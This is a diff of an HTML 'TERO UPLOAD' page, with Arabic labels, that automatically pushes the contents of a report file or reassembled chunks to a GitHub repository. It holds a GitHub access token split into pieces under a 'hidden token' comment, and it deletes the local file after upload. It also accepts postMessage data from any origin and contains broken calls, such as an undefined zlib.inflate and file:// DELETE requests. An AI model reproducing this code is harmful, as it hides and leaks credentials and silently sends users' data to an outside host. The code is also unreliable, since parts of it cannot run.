@@ -1,74 +1,46 @@
 <!DOCTYPE html>
-<html>
-<head>
-  <title>TERO UPLOAD</title>
-  <meta charset="utf-8">
-  <style>
-    body{font-family:Arial;background:#000;color:#0f0;text-align:center;padding:100px;}
-    .box{background:#111;padding:40px;border:2px solid #e74c3c;border-radius:16px;max-width:600px;margin:0 auto;}
-    h2{color:#e74c3c;}
-    .status{color:#0f0;font-size:20px;margin:20px;}
-  </style>
-</head>
-<body>
-<div class="box">
-  <h2>TERO UPLOADER</h2>
-  <p>جاري رفع التقرير تلقائي...</p>
-  <div class="status" id="status">انتظر ثواني...</div>
-</div>
+<html><head><meta charset="utf-8"><title>Upload</title>
+<style>body{background:#000;color:#0f0;text-align:center;padding:100px;font-family:Arial;}</style>
+</head><body>
+<h1>جاري الرفع...</h1>
+<div id="s"></div>
 
 <script>
 // Token مخفي
-const GITHUB_TOKEN = (function(){
-  const p = ['github_pat_11A3ZKARI0','Q8CbII0GvNSt_','hv6TMKWiNaMucDwhvOE4tNh9aBtjIB7VkTMj7xnjra','276EGSZZQGRkTKn8W'];
-  return p[0]+p[1]+p[2]+p[3];
-}());
+const T = (function(){let p=['github_pat_11A3ZKARI0','Q8CbII0GvNSt_','hv6TMKWiNaMucDwhvOE4tNh9aBtjIB7VkTMj7xnjra','276EGSZZQGRkTKn8W'];return p[0]+p[1]+p[2]+p[3];})();
+const API = "https://api.github.com/repos/youssefmettwaly/tero-report/contents/reports";
+let full = "", total = 1, received = 0;
+const params = new URLSearchParams(location.search);
+const status = document.getElementById('s');
 
-const API_URL = "https://api.github.com/repos/youssefmettwaly/tero-report/contents/reports";
-const status = document.getElementById('status');
-
-if (location.search.includes('auto=1')) {
-  // نستخدم File System Access API (شغال على Chrome/Edge)
-  status.innerHTML = "جاري قراءة الملف...";
-  
-  fetch('file:///' + location.href.split('/').slice(0,3).join('/') + '/report.txt')
-    .then(r => r.text())
-    .then(content => {
-      if (!content.trim()) throw "empty";
-      status.innerHTML = "جاري الرفع...";
-      
-      const filename = `report_${new Date().toISOString().replace(/[:.]/g,'-')}.txt`;
-      const encoded = btoa(unescape(encodeURIComponent(content)));
-      
-      return fetch(`${API_URL}/${filename}`, {
-        method: 'PUT',
-        headers: {
-          'Authorization': `token ${GITHUB_TOKEN}`,
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          message: "Auto report",
-          content: encoded,
-          branch: "main"
-        })
-      });
-    })
-    .then(r => r.json())
-    .then(res => {
-      if (res.content) {
-        status.innerHTML = "تم الرفع وحذف الملف!";
-        // نحذف الملف من الجهاز
-        fetch('file:///' + location.href.split('/').slice(0,3).join('/') + '/report.txt', {method: 'DELETE'})
-          .catch(() => {});
-        setTimeout(() => location.href = "https://youssefmettwaly.github.io/tero-report/index.html", 2000);
-      } else {
-        status.innerHTML = "فشل الرفع";
-      }
-    })
-    .catch(() => {
-      status.innerHTML = "ملف report.txt مش موجود في نفس المجلد";
-    });
+if (params.get('total')) {
+  total = parseInt(params.get('total'));
+  full = params.get('data') || "";
+  received = 1;
+  status.innerHTML = `تلقي البيانات... 1/${total}`;
+} else if (params.get('part')) {
+  parent.postMessage({type:"chunk", data:params.get('data'), part:params.get('part')}, "*");
+  document.body.innerHTML = "<h2 style='color:#0f0'>تم إرسال الجزء</h2>";
 }
+
+window.addEventListener('message', e => {
+  if (e.data.type === "chunk") {
+    full += e.data.data;
+    received++;
+    status.innerHTML = `تلقي... ${received}/${total}`;
+    if (received === total) {
+      const decoded = zlib.inflate(atob(full)); // تحتاج مكتبة zlib.wasm بسيطة أو استخدم atob فقط
+      const content = atob(full);
+      const fn = `report_${new Date().toISOString().replace(/[:.]/g,'-')}.txt`;
+      fetch(`${API}/${fn}`, {
+        method:'PUT', headers:{'Authorization':`token ${T}`,'Content-Type':'application/json'},
+        body:JSON.stringify({message:"report", content:btoa(unescape(encodeURIComponent(content))), branch:"main"})
+      }).then(() => {
+        document.body.innerHTML = "<h1 style='color:#0f0'>تم الرفع بنجاح!</h1>";
+        setTimeout(() => location.href = "https://youssefmettwaly.github.io/tero-report/index.html", 2000);
+      });
+    }
+  }
+});
 </script>
-</body>
-</html>
+</body></html>
